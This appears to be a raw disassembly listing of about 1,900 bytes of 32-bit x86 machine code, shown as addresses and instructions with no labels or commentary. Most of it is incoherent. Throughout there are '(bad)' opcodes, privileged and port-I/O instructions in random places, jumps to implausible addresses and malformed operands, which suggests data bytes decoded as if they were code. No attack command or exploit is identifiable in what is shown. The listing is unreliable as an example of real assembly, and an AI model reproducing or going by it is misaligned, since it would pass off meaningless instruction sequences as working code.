  4327e1:	add    DWORD PTR [ebp-0x1c],eax
  4327e4:	mov    edx,DWORD PTR [ebp-0x70]
  4327e7:	cmp    eax,DWORD PTR [eax]
  4327e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4327ea:	mov    eax,DWORD PTR [eax]
  4327ec:	cld    
  4327ed:	jae    0x43276f
  4327ef:	add    eax,DWORD PTR [ecx]
  4327f1:	clc    
  4327f2:	add    BYTE PTR [eax+0x30],dl
  4327f5:	mov    DWORD PTR [ecx],esi
  4327f7:	clc    
  4327f8:	pop    ds
  4327f9:	inc    ebp
  4327fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432800:	(bad)  
  432801:	push   DWORD PTR [edi]
  432803:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432809:	(bad)  
  43280a:	jae    0x43280b
  43280c:	mov    eax,DWORD PTR [ebp-0x740175]
  432812:	sub    eax,DWORD PTR [eax]
  432814:	add    eax,DWORD PTR [eax]
  432816:	mov    DWORD PTR [ecx+0x5f],eax
  432819:	mov    DWORD PTR [ebx-0x4],ebx
  43281c:	ret    0xff
  43281f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432825:	ret    
  432826:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43282c:	add    BYTE PTR [ebp-0x7d],al
  43282f:	mov    DWORD PTR [eax],eax
  432831:	add    al,0x84
  432833:	inc    DWORD PTR [ecx]
  432835:	lea    eax,[eax]
  432837:	hlt    
  432838:	sar    bh,cl
  43283a:	test   BYTE PTR [eax+0x1],dl
  43283d:	inc    ebp
  43283e:	add    BYTE PTR [ebx],dh
  432840:	test   BYTE PTR [ebx],0x84
  432843:	push   eax
  432844:	add    BYTE PTR [ebp+0x0],al
  432847:	add    eax,0x86
  43284c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432852:	add    BYTE PTR [ecx],al
  432854:	add    BYTE PTR [eax],al
  432856:	mov    esi,0x550030
  43285b:	mov    ecx,DWORD PTR [edi]
  43285d:	cld    
  43285e:	fidiv  DWORD PTR [ebp+0x0]
  432861:	mov    edi,DWORD PTR [ecx]
  432863:	xor    BYTE PTR [eax+eax*1],0x84
  432867:	add    eax,DWORD PTR [eax]
  432869:	sbb    BYTE PTR [eax],al
  43286b:	jne    0x43281e
  43286d:	mov    eax,DWORD PTR [ecx]
  43286f:	sbb    BYTE PTR [eax],al
  432871:	mov    DWORD PTR [ebp-0x1],esp
  432874:	add    BYTE PTR [eax+0x30e45ca],bh
  43287a:	ret    0xb7fc
  43287d:	dec    ebp
  43287e:	or     al,0x89
  432880:	dec    ebp
  432881:	cld    
  432882:	cmovne ecx,DWORD PTR [eax-0x75]
  432886:	add    edi,esp
  432888:	seto   BYTE PTR [esi-0x72ffffff]
  43288f:	inc    ebp
  432890:	adc    al,0x8b
  432892:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432899:	cmp    DWORD PTR [edi+0x72],edx
  43289c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4328a2:	gs cmp al,0x0
  4328a5:	je     0x43287d
  4328a7:	push   eax
  4328a8:	sar    BYTE PTR [eax],1
  4328aa:	mov    bh,0x3e
  4328ac:	push   cs
  4328ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4328b3:	add    DWORD PTR [ecx+0x12],ebp
  4328b6:	dec    edx
  4328b7:	(bad)  
  4328b8:	mov    eax,edx
  4328ba:	in     al,dx
  4328bb:	adc    DWORD PTR [ecx],esi
  4328bd:	pop    esi
  4328be:	inc    ecx
  4328bf:	leave  
  4328c0:	or     DWORD PTR [eax],ebx
  4328c2:	gs push ebp
  4328c4:	add    ah,ch
  4328c6:	into   
  4328c7:	in     al,dx
  4328c8:	enter  0xb756,0xf0
  4328cc:	push   cs
  4328cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4328d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4328dd:	jnp    0x7443ade5
  4328e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4328e9:	add    BYTE PTR [edi],cl
  4328eb:	mov    edi,DWORD PTR [ecx-0x78]
  4328ee:	ltr    WORD PTR [ecx-0x7b]
  4328f2:	dec    DWORD PTR [edi]
  4328f4:	clc    
  4328f5:	out    0x45,eax
  4328f7:	add    BYTE PTR [eax],cl
  4328f9:	cmp    ebx,0xffffff8c
  4328fc:	jge    0x4328fe
  4328fe:	jb     0x432910
  432900:	je     0x522980
  432906:	pop    edx
  432907:	push   esi
  432908:	mov    ecx,DWORD PTR [edi]
  43290a:	in     al,dx
  43290b:	rol    DWORD PTR [ebp+0x0],1
  43290e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432915:	cmp    DWORD PTR [ecx],0xfffffff0
  432918:	hlt    
  432919:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43291f:	(bad)  
  432921:	push   eax
  432922:	jns    0xb8430da0
  432928:	lock push cs
  43292a:	ror    edx,0x3
  43292d:	test   BYTE PTR [ecx+0x5500e800],cl
  432933:	dec    eax
  432934:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432938:	(bad)  
  432939:	mov    esi,0x7f33ff5f
  43293e:	inc    eax
  43293f:	test   DWORD PTR [edx],eax
  432941:	je     0x432903
  432943:	mov    ecx,ecx
  432945:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432949:	and    eax,DWORD PTR [eax+0xf0103]
  43294f:	jp     0x43293d
  432951:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432955:	add    edx,DWORD PTR [edi+0x74]
  432958:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43295e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432964:	je     0x4328e9
  432966:	cmp    eax,edi
  432968:	js     0x43298d
  43296a:	add    eax,0xeb0fc003
  43296f:	jns    0x4328fc
  432971:	vmread DWORD PTR [ecx+0x45],ebx
  432975:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43297b:	adc    al,0x8b
  43297d:	jge    0x432993
  43297f:	mov    edi,DWORD PTR [eax-0x4]
  432982:	add    edi,DWORD PTR [edi]
  432984:	or     bh,bh
  432986:	push   ebp
  432987:	push   es
  432988:	mov    DWORD PTR [ebp-0x4],ebx
  43298b:	add    edi,esi
  43298d:	pop    es
  43298e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432994:	mov    DWORD PTR [esp+esi*8],ecx
  432997:	inc    ebp
  432998:	pop    ebp
  432999:	xor    DWORD PTR [esi-0x4],0x3b
  43299d:	add    edx,DWORD PTR [ecx+edi*1]
  4329a0:	push   es
  4329a1:	clc    
  4329a2:	mov    bh,0xdb
  4329a4:	jp     0x43295d
  4329a6:	add    cl,BYTE PTR [esi]
  4329a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4329ae:	test   edi,edi
  4329b0:	je     0x4329a6
  4329b2:	mov    eax,ecx
  4329b4:	or     BYTE PTR [ebx],al
  4329b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4329bc:	jbe    0x432a30
  4329be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4329c4:	add    ecx,DWORD PTR [esi]
  4329c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4329cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4329d2:	je     0x432a21
  4329d4:	mov    DWORD PTR [ecx],edi
  4329d6:	mov    esi,eax
  4329d8:	hlt    
  4329d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4329e0:	jb     0x4329a2
  4329e2:	jmp    0x4329cf
  4329e4:	xor    esi,DWORD PTR [ebx]
  4329e6:	pop    edi
  4329e7:	pop    esi
  4329e8:	pop    ebx
  4329e9:	ret    
  4329ea:	ret    0x8b
  4329ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4329f3:	xor    DWORD PTR [esi],0xc
  4329f6:	pushf  
  4329f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4329fd:	(bad)  
  4329ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432a06:	dec    ebp
  432a07:	ret    
  432a08:	mov    edi,DWORD PTR [esi-0x4]
  432a0b:	pop    eax
  432a0c:	dec    ebp
  432a0d:	jne    0x43299a
  432a0f:	xor    edi,esp
  432a11:	inc    eax
  432a12:	dec    ebp
  432a13:	jbe    0x432a68
  432a15:	inc    eax
  432a16:	pop    ebp
  432a17:	add    edx,DWORD PTR [esi+0x8]
  432a1a:	push   ecx
  432a1b:	dec    eax
  432a1c:	push   ecx
  432a1d:	mov    eax,edi
  432a1f:	and    al,0xf0
  432a21:	jo     0x432a0e
  432a23:	mov    eax,DWORD PTR [ebx]
  432a25:	sbb    BYTE PTR [ebp+0x4d],cl
  432a28:	mov    eax,DWORD PTR [ebx]
  432a2a:	nop
  432a2b:	or     BYTE PTR [eax],al
  432a2d:	jne    0x432a86
  432a2f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432a35:	cld    
  432a36:	xor    edi,edi
  432a38:	add    edi,DWORD PTR [ebp+0x3]
  432a3b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432a41:	js     0x4329c7
  432a43:	jae    0x432a47
  432a45:	(bad)  
  432a47:	xor    al,0x5d
  432a49:	jmp    0x4329d6
  432a4b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432a52:	fdecstp 
  432a54:	test   BYTE PTR [edi],ah
  432a56:	add    bh,BYTE PTR [ebp+0x0]
  432a59:	add    ebx,DWORD PTR [ebp-0x77]
  432a5c:	mov    edi,eax
  432a5e:	cmp    al,0x0
  432a61:	adc    dh,BYTE PTR [ebx]
  432a63:	jge    0x432a68
  432a65:	mov    edi,DWORD PTR [ebx]
  432a67:	jl     0x432a78
  432a69:	clc    
  432a6a:	dec    edi
  432a6b:	jge    0x432a6d
  432a6d:	mov    eax,DWORD PTR [ebx]
  432a6f:	jb     0x432a79
  432a71:	mov    ecx,DWORD PTR [ebp-0x8]
  432a74:	mov    edi,edi
  432a76:	xor    edx,DWORD PTR [eax]
  432a78:	add    edi,DWORD PTR [ebx]
  432a7a:	mov    DWORD PTR [ebp-0x10],edi
  432a7d:	inc    edi
  432a7e:	pop    ebp
  432a7f:	jge    0x432abc
  432a81:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432a85:	mov    edx,0xc05d87f0
  432a8a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432a8e:	fimul  WORD PTR [eax]
  432a90:	fist   WORD PTR [ebp+0x1c]
  432a93:	in     al,dx
  432a94:	jne    0x432a82
  432a96:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432a9c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432aa0:	fdivp  st(0),st
  432aa2:	fild   WORD PTR [ebp+0x4510f85c]
  432aa8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432aae:	inc    ebp
  432aaf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432ab5:	mov    ebp,DWORD PTR [ebx-0x4]
  432ab8:	adc    al,0x8b
  432aba:	rcl    DWORD PTR [eax],0x48
  432abd:	mov    esi,0x7080803
  432ac2:	fiadd  WORD PTR [ebp+0x4d]
  432ac5:	mov    WORD PTR [ebx+0x558bfc52],cs
  432acb:	cld    
  432acc:	xor    ebx,DWORD PTR [ebx+0x330103]
  432ad2:	mov    DWORD PTR [edi+0x872dc],edi
  432ad8:	xlat   BYTE PTR ds:[ebx]
  432ad9:	into   
  432ada:	ffreep st(6)
  432adc:	retf   0x6c7
  432adf:	iret   
  432ae0:	dec    ebp
  432ae1:	inc    ebp
  432ae2:	mov    DWORD PTR [ebx],edi
  432ae4:	fmul   QWORD PTR [edi]
  432ae6:	dec    ebp
  432ae7:	jnp    0x432b1c
  432ae9:	add    BYTE PTR [ebx],al
  432aeb:	mov    ecx,DWORD PTR [esp+edi*8]
  432aee:	inc    ebp
  432aef:	dec    ebp
  432af0:	lea    esi,[ebx]
  432af2:	add    DWORD PTR [ebx],eax
  432af4:	jb     0x432b31
  432af6:	add    BYTE PTR [edi],cl
  432af8:	inc    ebp
  432af9:	imul   eax,edi,0x858bd800
  432aff:	cld    
  432b00:	clc    
  432b01:	mov    DWORD PTR [ebp+0x0],eax
  432b04:	inc    DWORD PTR [eax]
  432b06:	or     al,0xde
  432b08:	sbb    bh,0x1
  432b0b:	retf   
  432b0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432b13:	dec    ebp
  432b14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432b1a:	enter  0x12de,0xdf
  432b1e:	inc    ebp
  432b1f:	pop    ebp
  432b20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432b26:	add    DWORD PTR [edx],edx
  432b28:	add    BYTE PTR [ebp+0x50],dl
  432b2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432b31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432b37:	or     ah,al
  432b39:	pop    ss
  432b3a:	cdq    
  432b3b:	push   ebp
  432b3c:	clc    
  432b3d:	mov    eax,DWORD PTR [ebp-0x4]
  432b40:	xor    edx,edx
  432b42:	add    esi,DWORD PTR [ebx]
  432b44:	cmp    eax,DWORD PTR [ebx]
  432b46:	hlt    
  432b47:	cmp    DWORD PTR [ebx],esp
  432b49:	or     al,BYTE PTR [ebp+0xf]
  432b4c:	mov    eax,DWORD PTR [edx]
  432b4e:	loopne 0x432b50
  432b50:	(bad)  
  432b51:	mov    ecx,esi
  432b53:	cld    
  432b54:	pushf  
  432b55:	pop    ebp
  432b56:	cdq    
  432b57:	mov    esi,DWORD PTR [edx]
  432b59:	lock mov eax,eax
  432b5c:	adc    BYTE PTR [ebx],al
  432b5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432b65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432b6b:	dec    ebp
  432b6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432b72:	(bad)  
  432b73:	iret   
  432b74:	inc    ebp
  432b75:	(bad)  
  432b76:	jne    0x432bc5
  432b78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432b7e:	(bad)  
  432b7f:	cmp    ebx,eax
  432b81:	je     0x432b09
  432b83:	add    edi,edi
  432b85:	or     bh,bh
  432b87:	dec    ebp
  432b88:	inc    ebp
  432b89:	mov    esi,DWORD PTR [ebx]
  432b8b:	cld    
  432b8c:	add    ecx,esi
  432b8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432b91:	mov    edx,DWORD PTR [edi]
  432b93:	or     BYTE PTR [ebp-0x7c],al
  432b96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432b9c:	test   BYTE PTR [ecx+ebx*4],cl
  432b9f:	inc    ebp
  432ba0:	xor    bh,BYTE PTR ds:0x8be89c89
  432ba6:	out    dx,eax
  432ba7:	adc    BYTE PTR [eax],al
  432ba9:	jne    0x432b72
  432bab:	mov    ebp,esp
  432bad:	fcomp  DWORD PTR [ebx]
  432baf:	add    BYTE PTR [ecx],al
  432bb1:	inc    DWORD PTR [ebp-0x75]
  432bb4:	mov    esp,?
  432bb6:	add    al,0xce
  432bb8:	mov    ecx,edi
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	fidivr WORD PTR [ebx]
  432bbe:	fbstp  TBYTE PTR [ebp-0x3e]
  432bc1:	mov    eax,DWORD PTR [eax]
  432bc3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432bc9:	fadd   st,st(7)
  432bcb:	add    BYTE PTR [ebp-0x1],al
  432bce:	mov    ecx,DWORD PTR [esp+edi*8]
  432bd1:	inc    ebp
  432bd2:	mov    bh,0xc7
  432bd5:	loopne 0x432c1c
  432bd7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432bdd:	add    DWORD PTR [ebx],esi
  432bdf:	pushf  
  432be0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432be6:	mov    eax,edi
  432be8:	cwde   
  432be9:	inc    ebp
  432bea:	inc    ebp
  432beb:	jne    0x432b78
  432bed:	mov    esp,esp
  432bef:	clc    
  432bf0:	add    al,0x4d
  432bf2:	mov    DWORD PTR [ebx],esi
  432bf4:	or     al,0x33
  432bf6:	inc    ebp
  432bf7:	lea    ecx,[ebx-0x398d13fd]
  432bfd:	add    bh,al
  432bff:	inc    ebp
  432c00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432c07:	add    ebp,esp
  432c09:	shufps xmm1,xmm3,0xc7
  432c0d:	(bad)  
  432c0e:	jmp    0x74886737
  432c13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432c19:	hlt    
  432c1a:	mov    ecx,DWORD PTR [edi]
  432c1c:	fadd   DWORD PTR [ebp+0x0]
  432c1f:	xor    ecx,DWORD PTR [edi]
  432c21:	add    ecx,ecx
  432c23:	cmp    edi,edi
  432c25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432c29:	(bad)  
  432c2a:	jmp    0x432bb7
  432c2c:	mov    edi,esp
  432c2e:	or     al,0xc6
  432c30:	inc    ebp
  432c31:	(bad)  
  432c32:	mov    eax,DWORD PTR [ebp+0x10]
  432c35:	jne    0x432bc0
  432c37:	mov    eax,DWORD PTR [ecx]
  432c39:	clc    
  432c3a:	add    BYTE PTR [ebp-0x40],cl
  432c3d:	xor    edx,DWORD PTR [eax-0x73]
  432c40:	jne    0x432c43
  432c42:	push   DWORD PTR [edx+0x8]
  432c45:	add    BYTE PTR [ebp+0x45],al
  432c48:	mov    ebp,ecx
  432c4a:	cld    
  432c4b:	add    BYTE PTR [ebp+0x0],cl
  432c4e:	xor    eax,DWORD PTR [ebp+0x3]
  432c51:	mov    ?,WORD PTR [ebx]
  432c53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432c59:	sub    eax,0x5d330e4d
  432c5e:	lea    esi,[ebx]
  432c60:	add    DWORD PTR [ebx],eax
  432c62:	jb     0x432c4d
  432c64:	add    BYTE PTR [eax],al
  432c66:	inc    ebp
  432c67:	add    bl,ch
  432c69:	inc    ebp
  432c6a:	mov    esi,DWORD PTR [ebx]
  432c6c:	or     al,0x3
  432c6e:	(bad)  
  432c6f:	mov    edi,eax
  432c71:	in     al,dx
  432c72:	scas   eax,DWORD PTR es:[edi]
  432c73:	inc    ebp
  432c74:	mov    esi,DWORD PTR [ebx]
  432c76:	in     al,0x3
  432c78:	add    al,0x89
  432c7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432c7d:	dec    ebp
  432c7e:	(bad)  
  432c7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432c86:	mov    ecx,eax
  432c88:	cld    
  432c89:	push   es
  432c8a:	dec    ebp
  432c8b:	add    al,0x33
  432c8d:	mov    DWORD PTR [ebx],eax
  432c8f:	in     al,dx
  432c90:	cmp    DWORD PTR [ebp-0x67],eax
  432c93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432c99:	mov    edx,DWORD PTR [ebp-0x4]
  432c9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432c9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ca2:	cmp    DWORD PTR [ebx],0x8b327498
  432ca8:	xor    edi,esp
  432caa:	jmp    0xff7729fc
  432caf:	add    ecx,DWORD PTR [ebp-0x3f]
  432cb2:	xor    ebx,DWORD PTR [edi]
  432cb4:	add    eax,ecx
  432cb6:	cmp    ebx,DWORD PTR [eax]
  432cb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432cbb:	mov    ecx,DWORD PTR [eax]
  432cbd:	adc    BYTE PTR [ebp-0x80],al
  432cc0:	jmp    0x432cc3
  432cc2:	mov    eax,DWORD PTR [eax]
  432cc4:	cld    
  432cc5:	mov    bh,0xc6
  432cc7:	push   ecx
  432cc8:	(bad)  
  432cc9:	jne    0x432d29
  432ccb:	dec    ecx
  432ccd:	or     BYTE PTR [ecx+ebx*1],cl
  432cd0:	push   ebp
  432cd1:	inc    ebp
  432cd2:	in     al,dx
  432cd3:	add    ebp,esp
  432cd5:	or     bh,al
  432cd7:	dec    ebp
  432cd8:	cld    
  432cd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432cdf:	cmp    DWORD PTR [ecx],0x2
  432ce2:	pushf  
  432ce3:	dec    DWORD PTR [ebx+0x45510cf4]
  432ce9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432cef:	mov    edx,DWORD PTR [ecx+0xc]
  432cf2:	xor    eax,esi
  432cf4:	mov    edx,0xc172c7
  432cf9:	inc    ebp
  432cfa:	mov    esi,DWORD PTR [ebp+0x8]
  432cfd:	mov    eax,edx
  432cff:	call   0x84c7f3f4
  432d04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432d0a:	mov    ebp,eax
  432d0c:	or     BYTE PTR [eax],dl
  432d0e:	jo     0x432d5d
  432d10:	push   edi
  432d11:	xor    esi,DWORD PTR [ebp+0x3]
  432d14:	(bad)  
  432d15:	pmulhuw mm0,mm1
  432d18:	test   DWORD PTR [ebp-0x8],ecx
  432d1b:	mov    DWORD PTR [ebp-0x67],eax
  432d1e:	mov    eax,DWORD PTR [ebp-0x4]
  432d21:	xor    edi,DWORD PTR [ebp-0x73]
  432d24:	xor    eax,DWORD PTR [ebx]
  432d26:	xor    esi,DWORD PTR [edx+0x3]
  432d29:	add    BYTE PTR [ecx],bh
  432d2b:	inc    ebp
  432d2c:	(bad)  
  432d2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432d33:	mov    DWORD PTR [eax],0x750f0004
  432d39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432d3f:	lock add BYTE PTR [ebp+0x0],cl
  432d43:	mov    esi,DWORD PTR [ebp-0x18]
  432d46:	mov    ebp,edx
  432d48:	or     al,0x72
  432d4a:	ja     0x432d4c
  432d4c:	mov    edx,esi
  432d4e:	cld    
  432d4f:	(bad)  
  432d52:	cli    
  432d53:	mov    esi,DWORD PTR [ebp-0x4]
  432d56:	cmp    ecx,esi
  432d58:	bswap  edi
  432d5a:	(bad)
  432d5e:	mov    esi,DWORD PTR [ebp-0x4]
  432d61:	mov    esi,ecx
  432d63:	clc    
  432d64:	repnz add esi,DWORD PTR [ebp+0x45]
  432d68:	push   ebx
  432d69:	xor    eax,DWORD PTR [ebp+0x3]
  432d6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432d6f:	pop    ebx
  432d70:	jmp    0x432e37
  432d75:	mov    esi,DWORD PTR [ebp-0x7d]
  432d78:	xor    ebp,DWORD PTR [eax]
  432d7a:	lea    eax,[ebp-0x8]
  432d7d:	ss repnz pushf 
  432d80:	out    dx,eax
  432d81:	(bad)  
  432d82:	neg    eax
  432d84:	ins    DWORD PTR es:[edi],dx
  432d85:	test   esi,edi
  432d87:	clc    
  432d88:	pop    esp
  432d89:	inc    ebp
  432d8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432d90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432d96:	add    cl,al
  432d98:	jne    0x432d33
  432d9a:	mov    esi,DWORD PTR [edx]
  432d9c:	in     al,dx
  432d9d:	push   esi
  432d9e:	xor    BYTE PTR [ebp-0xe],dh
  432da1:	add    edi,esi
  432da3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432da9:	add    cl,bh
  432dab:	mov    edi,DWORD PTR [ebp+0x8]
  432dae:	mov    DWORD PTR [ebp-0x14],esi
  432db1:	add    esi,DWORD PTR [ebp+0x3c]
  432db4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432dba:	mov    ah,0x3d
  432dbc:	cdq    
  432dbd:	pushf  
  432dbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432dc4:	jne    0x432d51
  432dc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432dc9:	icebp  
  432dca:	icebp  
  432dcb:	shl    edx,0xf2
  432dce:	(bad)  
  432dcf:	mov    ah,0x16
  432dd1:	inc    eax
  432dd2:	jne    0x432d67
  432dd4:	mov    ecx,DWORD PTR [edi]
  432dd6:	in     al,dx
  432dd7:	jmp    0x432dca
  432dd9:	add    dl,dh
  432ddb:	mov    edi,esi
  432ddd:	or     al,0x8
  432ddf:	inc    ebp
  432de0:	jne    0x432de5
  432de2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432de8:	ret    
  432de9:	or     bh,bh
  432deb:	jge    0x432dd5
  432ded:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432df3:	xor    edi,eax
  432df5:	add    esi,DWORD PTR [ebp-0x77]
  432df8:	mov    ebx,esp
  432dfa:	clc    
  432dfb:	neg    DWORD PTR [ebp-0x7c]
  432dfe:	xor    eax,DWORD PTR [eax]
  432e00:	cmp    eax,DWORD PTR [eax]
  432e02:	repz jne 0x432d9a
  432e05:	xor    eax,DWORD PTR [ecx]
  432e07:	add    ebx,DWORD PTR [eax]
  432e09:	mov    DWORD PTR [ebp-0x8],eax
  432e0c:	mov    eax,edi
  432e0e:	cld    
  432e0f:	lock pop eax
  432e11:	test   DWORD PTR [ebx],esi
  432e13:	clc    
  432e14:	add    edx,DWORD PTR [edi-0x740bff77]
  432e1a:	fdivp  st(4),st
  432e1c:	test   ecx,esi
  432e1e:	(bad)  
  432e1f:	jnp    0x432e20
  432e21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432e27:	jae    0x432db4
  432e29:	sub    edi,esp
  432e2b:	(bad)  
  432e2c:	shl    DWORD PTR [eax-0x3e],0x89
  432e30:	leave  
  432e31:	call   0x8198e53e
  432e36:	in     al,dx
  432e37:	(bad)  
  432e38:	in     al,dx
  432e39:	add    bh,al
  432e3b:	mov    esp,edi
  432e3d:	in     al,dx
  432e3e:	test   DWORD PTR [ebp-0x8],edi
  432e41:	mov    eax,DWORD PTR [ebp+0x2b]
  432e44:	cmp    DWORD PTR [ebx],eax
  432e46:	pushf  
  432e47:	jnp    0x57322a80
  432e4d:	xor    edx,DWORD PTR [ecx-0x77]
  432e50:	push   ecx
  432e51:	loopne 0x432e86
  432e53:	jne    0x432e10
  432e55:	mov    esi,DWORD PTR [edx-0x20]
  432e58:	add    BYTE PTR [ebp-0x3d],bh
  432e5b:	xor    eax,DWORD PTR [ebp-0x73]
  432e5e:	mov    edi,DWORD PTR [esi]
  432e60:	cld    
  432e61:	jb     0x432e29
  432e63:	add    bl,al
  432e65:	jne    0x432eac
  432e67:	mov    edx,DWORD PTR [edi-0x10]
  432e6a:	jge    0x432ee9
  432e6c:	mov    esi,DWORD PTR [ebx]
  432e6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432e72:	xor    esi,DWORD PTR [ebp-0x77]
  432e75:	mov    esi,eax
  432e77:	lock inc ebp
  432e79:	jge    0x432eb1
  432e7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432e82:	dec    ebp
  432e83:	mov    esi,DWORD PTR [ebx]
  432e85:	loopne 0x432e10
  432e87:	jge    0x432e81
  432e89:	add    DWORD PTR [ebp-0x7d],eax
  432e8c:	test   BYTE PTR [edx],0x9c
  432e8f:	dec    ebp
  432e90:	mov    esi,DWORD PTR [ebp-0xc]
  432e93:	mov    ecx,DWORD PTR [ebp-0xc]
  432e96:	xor    ebx,DWORD PTR [ebp-0x77]
  432e99:	mov    esi,esp
  432e9b:	in     al,0x45
  432e9d:	jge    0x432ed9
  432e9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432ea6:	dec    ebp
  432ea7:	inc    esp
  432ea8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432eae:	inc    ebp
  432eaf:	hlt    
  432eb0:	ss jne 0x432e52
  432eb3:	mov    edi,DWORD PTR [eax+0xf19504]
  432eb9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432ebd:	cmp    eax,DWORD PTR [ebp+0xf]
  432ec0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432ec4:	fistp  WORD PTR [ebx+0x0]
  432ec7:	inc    ebp
  432ec8:	mov    ebx,DWORD PTR [edi+0xc]
  432ecb:	add    eax,eax
  432ecd:	inc    ebp
  432ece:	test   BYTE PTR [ebx],dh
  432ed0:	add    eax,DWORD PTR [ebx]
  432ed2:	add    BYTE PTR [esi+0x45],bl
  432ed5:	ret    0x85
  432ed8:	jnp    0x5443b2a7
  432ede:	inc    bp
  432ee0:	inc    ebp
  432ee1:	ss mov ecx,0xc78a9c
  432ee7:	fdiv   QWORD PTR [ebx]
  432ee9:	test   DWORD PTR [ecx+0x453af8],edi
  432eef:	push   ebx
  432ef0:	add    edi,DWORD PTR [esi+0x708088b]
  432ef6:	cmp    esi,eax
  432ef8:	setns  BYTE PTR [ecx-0x74fcffce]
  432eff:	mov    esp,edi
  432f01:	call   0x33ce7453
  432f06:	or     BYTE PTR [ebx],al
  432f08:	inc    ecx
  432f09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432f0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432f15:	lock add cl,al
  432f18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432f1f:	mov    ch,0x45
  432f21:	clc    
  432f22:	xor    eax,DWORD PTR [ebp+0x3]
  432f25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432f2b:	inc    ebp
  432f2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432f32:	mov    edi,eax
  432f34:	mov    eax,DWORD PTR [ebp+0x3c]
  432f37:	mov    ecx,DWORD PTR [eax]
  432f39:	hlt    
  432f3a:	inc    ebp
  432f3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432f42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432f48:	push   ebp
  432f49:	mov    edi,DWORD PTR [ebx]
